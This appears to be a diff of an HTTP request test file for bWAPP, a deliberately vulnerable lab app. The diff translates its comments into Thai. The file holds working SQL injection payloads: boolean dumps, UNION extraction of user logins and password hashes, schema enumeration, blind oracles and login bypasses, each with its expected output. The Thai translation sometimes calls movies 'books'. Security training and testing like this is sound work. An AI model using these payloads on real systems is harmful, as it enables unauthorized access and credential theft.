@@ -1,100 +1,100 @@
 ### ============================================================================
 ### 01 - A1 Injection / SQL Injection
-###   Target: MySQL 5.5 (ext/mysql + mysqli), PHP 5.5, no prepared statements
-###   Vulnerable sinks (app source, /app):
+###   เป้าหมาย: MySQL 5.5 (ext/mysql + mysqli), PHP 5.5, ไม่ใช้ prepared statements
+###   จุดที่รับข้อมูลแล้วเสี่ยง (source ของแอป, /app):
 ###     sqli_1.php   SELECT * FROM movies WHERE title LIKE '%<title>%'   GET  "title"
-###     sqli_2.php   SELECT * FROM movies WHERE id = <movie>             GET  "movie"  (unquoted int!)
+###     sqli_2.php   SELECT * FROM movies WHERE id = <movie>            GET  "movie"  (ไม่มี quote)
 ###     sqli_3.php   SELECT * FROM heroes WHERE login='<login>' AND ...  POST "login"/"password"
 ###     sqli_4.php   boolean blind: SELECT * FROM movies WHERE title='<title>'
-###     sqli_6.php   POST LIKE search
+###     sqli_6.php   POST ค้นด้วย LIKE
 ###     sqli_7.php   INSERT INTO blog (...) VALUES (now(),'<entry>','<owner>')
-###     sqli_10-2.php GET LIKE, returns text/json
-###     sqli_16.php  SELECT * FROM users WHERE login='<login>'   (login form)
+###     sqli_10-2.php GET LIKE, ตอบกลับเป็น text/json
+###     sqli_16.php  SELECT * FROM users WHERE login='<login>'   (ฟอร์ม login)
 ###     xxe-2.php    UPDATE users SET secret='<secret>' WHERE login='<login>'
 ###
-###   Column order of the `movies` table (what the UI prints):
+###   ลำดับคอลัมน์ของตาราง `movies` (ตามที่ UI พิมพ์ออกมา):
 ###     title | release_year | main_character | genre | imdb
-###   (schema order is id,title,release_year,genre,main_character,imdb -
-###    the template swaps genre and main_character when rendering)
+###   (ลำดับใน schema คือ id,title,release_year,genre,main_character,imdb -
+###    ตอน render template จะสลับ genre กับ main_character)
 ### ============================================================================
 
 ### ---------------------------------------------------------------------------
-### SQLI-01  Boolean: dump every movie
+### SQLI-01  Boolean: ดัมพ์หนังสือออกมาทั้งหมด
 ###   Payload: ' OR 1=1-- -
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sqli_1.php?title=%27%20OR%201%3D1--%20-&action=go HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, all 9 movies listed (G.I. Joe ... World War Z)
-###   URL-decoded: /sqli_1.php?title=' OR 1=1-- -&action=go
+### Expected: 200, หนังสือครบ 9 เรื่อง (G.I. Joe ... World War Z)
+###   URL decode แล้ว: /sqli_1.php?title=' OR 1=1-- -&action=go
 
 
 ### ---------------------------------------------------------------------------
-### SQLI-02  UNION: determine the column count
-###   1,2,3,4,5,6 -> works.  7 columns -> "The used SELECT statements have a
-###   different number of columns". That error message is the enumeration oracle.
+### SQLI-02  UNION: นับจำนวนคอลัมน์
+###   1,2,3,4,5,6 -> ผ่าน  7 คอลัมน์ -> "The used SELECT statements have a
+###   different number of columns" ข้อความ error นี้คือ oracle สำหรับนับคอลัมน์
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sqli_1.php?title=%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%2C6--%20-&action=go HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, an extra row rendered from our SELECT
+### Expected: 200, มีแถวพิเศษที่ render มาจาก SELECT ของเรา
 
 
 ### ---------------------------------------------------------------------------
-### SQLI-03  UNION dump of the `users` table (full credential exfiltration)
-###   The sink is `WHERE id = <movie>` with NO quotes, so start the id at 0
-###   to avoid a matching movie row shadowing the injected one.
-###   GROUP_CONCAT is required: sqli_2.php only renders mysql_fetch_array()'s
-###   FIRST row, so a plain UNION would only ever show users.id = 1.
+### SQLI-03  UNION ดัมพ์ตาราง `users` (ดึง credential ออกมาทั้งชุด)
+###   จุดรับคือ `WHERE id = <movie>` ที่ไม่มี quote ต้องเริ่ม id ที่ 0
+###   ไม่งั้นแถวหนังสือที่ id ตรงกันจะบังแถวที่เรา inject
+###   ต้องใช้ GROUP_CONCAT: sqli_2.php render แค่แถวแรกจาก mysql_fetch_array()
+###   ถ้าใช้ UNION ตรง ๆ จะเห็นแค่ users.id = 1
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sqli_2.php?movie=0%20UNION%20SELECT%201%2CGROUP_CONCAT(login)%2CGROUP_CONCAT(password)%2C4%2C5%2C6%20FROM%20users--%20-&action=go HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, Title column = "A.I.M.,bee"
-###           Release column = "6885858486f31043e5839c735d99457f045affd0,688585..."
-###           (that is SHA1("bug") twice - both accounts share the default password)
+### Expected: 200, คอลัมน์ Title = "A.I.M.,bee"
+###           คอลัมน์ Release = "6885858486f31043e5839c735d99457f045affd0,688585..."
+###           (คือ SHA1("bug") สองครั้ง - ทั้งสองบัญชีใช้รหัสผ่านเดิม)
 
 
 ### ---------------------------------------------------------------------------
-### SQLI-04  Error/context based: leak the current database name
+### SQLI-04  อิง error/context: ดูชื่อฐานข้อมูลที่ใช้อยู่
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sqli_2.php?movie=0%20UNION%20SELECT%201%2Cdatabase()%2C3%2C4%2C5%2C6--%20-&action=go HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, Title column = "bWAPP"
+### Expected: 200, คอลัมน์ Title = "bWAPP"
 
 
 ### ---------------------------------------------------------------------------
-### SQLI-05  Enumerate the schema from information_schema
+### SQLI-05  ไล่ดู schema จาก information_schema
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sqli_2.php?movie=0%20UNION%20SELECT%201%2CGROUP_CONCAT(table_name)%2C3%2C4%2C5%2C6%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase()--%20-&action=go HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, Title column contains "blog,heroes,movies,users"
+### Expected: 200, คอลัมน์ Title มี "blog,heroes,movies,users"
 
 
 ### ---------------------------------------------------------------------------
-### SQLI-06  Boolean blind (sqli_4.php) - TRUE branch
-###   sqli_4.php only answers "The movie exists in our database!" / "does not
-###   exist", which is a clean boolean oracle for a scripted extractor.
+### SQLI-06  Boolean blind (sqli_4.php) - สาขา TRUE
+###   sqli_4.php ตอบได้แค่ "The movie exists in our database!" / "does not
+###   exist" ซึ่งเป็น boolean oracle ที่สะอาด ทำให้เขียนสคริปต์ดึงข้อมูลต่อได้
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sqli_4.php?title=%27%20OR%20%271%27%3D%271&action=search HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, body contains "The movie exists in our database!"
+### Expected: 200, body ต้องมี "The movie exists in our database!"
 
 
 ### ---------------------------------------------------------------------------
-### SQLI-07  Boolean blind - FALSE branch (control, proves the oracle is real)
+### SQLI-07  Boolean blind - สาขา FALSE (control, ยืนยันว่า oracle ใช้ได้จริง)
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sqli_4.php?title=%27%20OR%20%271%27%3D%270&action=search HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, body contains "The movie does not exist in our database!"
+### Expected: 200, body ต้องมี "The movie does not exist in our database!"
 
 
 ### ---------------------------------------------------------------------------
-### SQLI-08  POST LIKE search (sqli_6.php)
+### SQLI-08  POST ค้นด้วย LIKE (sqli_6.php)
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/sqli_6.php HTTP/1.1
 Host: localhost:8443
@@ -102,12 +102,12 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 title=%27%20OR%201%3D1--%20-&form=submit
-### Expected: 200, all movies returned
+### Expected: 200, คืนหนังสือครบทุกเรื่อง
 
 
 ### ---------------------------------------------------------------------------
-### SQLI-09  Login-form bypass against `heroes` (sqli_3.php)
-###   LIMIT 1 matters: the page renders one row, and we want the first.
+### SQLI-09  ข้าม auth ของฟอร์ม login ตาราง `heroes` (sqli_3.php)
+###   LIMIT 1 สำคัญ: หน้านี้ render แค่หนึ่งแถว และเราต้องการแถวแรก
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/sqli_3.php HTTP/1.1
 Host: localhost:8443
@@ -115,12 +115,12 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 login=%27%20OR%201%3D1%20LIMIT%201--%20-&password=x&form=submit
-### Expected: 200, secret of hero id 1 (neo): "Oh why didn't I took that BLACK pill?"
+### Expected: 200, secret ของ hero id 1 (neo): "Oh why didn't I took that BLACK pill?"
 
 
 ### ---------------------------------------------------------------------------
-### SQLI-10  Login-form bypass against `users` (sqli_16.php)
-###   Bypasses authentication AND discloses the session's secret value.
+### SQLI-10  ข้าม auth ของฟอร์ม login ตาราง `users` (sqli_16.php)
+###   ข้าม authentication ได้ และเปิดเผยค่า secret ของ session ด้วย
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/sqli_16.php HTTP/1.1
 Host: localhost:8443
@@ -128,23 +128,23 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 login=%27%20OR%201%3D1%20LIMIT%201--%20-&password=x&form=submit
-### Expected: 200, "Welcome ..." in the menu bar - logged in as A.I.M. without a password
+### Expected: 200, มี "Welcome ..." ในแถบเมนู - login เป็น A.I.M. ได้โดยไม่ต้องใช้รหัสผ่าน
 
 
 ### ---------------------------------------------------------------------------
-### SQLI-11  AJAX / JSON endpoint (sqli_10-2.php)
-###   Same UNION, but the response is text/json - a different content-type
-###   sink, so filters that only look at HTML can miss it.
+### SQLI-11  endpoint แบบ AJAX / JSON (sqli_10-2.php)
+###   ใช้ UNION เหมือนกัน แต่ response เป็น text/json - เป็น content-type
+###   คนละจุดรับ ฟิลเตอร์ที่ดูแค่ HTML จะมองข้ามไป
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sqli_10-2.php?title=%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%2C6--%20- HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200 Content-Type: text/json, keys title/release_year/main_character/genre/imdb
+### Expected: 200 Content-Type: text/json, มี key title/release_year/main_character/genre/imdb
 
 
 ### ---------------------------------------------------------------------------
-### SQLI-12  Stacked / subquery injection in the blog INSERT (sqli_7.php)
-###   The entry is concatenated into an INSERT; the subquery replaces owner.
+### SQLI-12  Stacked / subquery injection ใน INSERT ของ blog (sqli_7.php)
+###   entry ถูกต่อสตริงเข้าไปใน INSERT แล้ว subquery ไปแทนที่ owner
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/sqli_7.php HTTP/1.1
 Host: localhost:8443
@@ -152,14 +152,14 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 entry=x%27%2C(SELECT%20login%20FROM%20users%20LIMIT%201)%2C%272024-01-01%27%2C%27bee%27)%3B--%20-&blog=submit&entry_add=on&entry_all=on&form=submit
-### Expected: 200, the blog listing shows the injected owner value
+### Expected: 200, หน้ารายการ blog แสดงค่า owner ที่ถูก inject
 
 
 ### ---------------------------------------------------------------------------
-### SQLI-13  SQL injection over the XML AJAX endpoint (sqli_8-2.php)
-###   This is the bWAPP "SQLi AJAX/JSON/jQuery" bug: a JS button POSTs XML to
-###   sqli_8-2.php, which runs UPDATE users SET secret='<secret>' WHERE login='<login>'.
-###   Reproduce the exact request the browser makes.
+### SQLI-13  SQL injection ผ่าน XML AJAX endpoint (sqli_8-2.php)
+###   นี่คือบั๊ก "SQLi AJAX/JSON/jQuery" ของ bWAPP ปุ่มใน JS ส่ง XML แบบ POST
+###   ไปที่ sqli_8-2.php ซึ่งรัน UPDATE users SET secret='<secret>' WHERE login='<login>'.
+###   ทำซ้ำ request เดียวกับที่เบราว์เซอร์ส่งออกไปจริง ๆ
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/sqli_8-2.php HTTP/1.1
 Host: localhost:8443
@@ -167,13 +167,13 @@ Cookie: {{authCookie}}
 Content-Type: text/xml; charset=UTF-8
 
 <reset><login>bee</login><secret>Any bugs?</secret></reset>
-### Expected: 200, "bee's secret has been reset!" - your session secret is now attacker-chosen
+### Expected: 200, "bee's secret has been reset!" - secret ของ session ถูกผู้โจมตีกำหนดค่าเองแล้ว
 
 
 ### ---------------------------------------------------------------------------
-### SQLI-14  Boolean SQLi in the WHERE clause of that XML endpoint
-###   A trailing quote alone breaks the statement (see 05-xxe.http XXI-03);
-###   this is the working, non-erroring boolean form.
+### SQLI-14  Boolean SQLi ใน WHERE clause ของ XML endpoint นั้น
+###   quote ท้าย ๆ อย่างเดียวก็ทำให้ statement พัง (ดู 05-xxe.http XXI-03)
+###   รูปแบบนี้คือ boolean form ที่ใช้ได้จริงและไม่ขึ้น error
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/sqli_8-2.php HTTP/1.1
 Host: localhost:8443
@@ -185,15 +185,15 @@ Content-Type: text/xml; charset=UTF-8
 
 
 ### ---------------------------------------------------------------------------
-### SQLI-15  Authentication bypass on the REAL login form (login.php)
-###   login.php escapes input with mysqli_real_escape_string and hashes with
-###   SHA1, so plain OR-based SQLi fails here. This documents the negative
-###   result so the report does not overstate the finding:
-###   login.php is the one login form that is NOT injectable.
+### SQLI-15  ข้าม auth บนฟอร์ม login ตัวจริง (login.php)
+###   login.php escape input ด้วย mysqli_real_escape_string และ hash ด้วย
+###   SHA1 ดังนั้น SQLi แบบใช้ OR ธรรมดาจะไม่ผ่านที่นี่ บรรทัดนี้บันทึกผลลบไว้
+###   เพื่อไม่ให้รายงานเขียนเกินจริงว่า:
+###   login.php คือฟอร์ม login หน้าเดียวที่ inject ไม่ได้
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/login.php HTTP/1.1
 Host: localhost:8443
 Content-Type: application/x-www-form-urlencoded
 
 login=bee%27%20OR%20%271%27%3D%271&password=x&security_level=0&form=submit
-### Expected: 200 with "Failed to login" - injection is correctly neutralised here
+### Expected: 200 with "Failed to login" - injection ถูกกรองออกได้ถูกต้องที่นี่
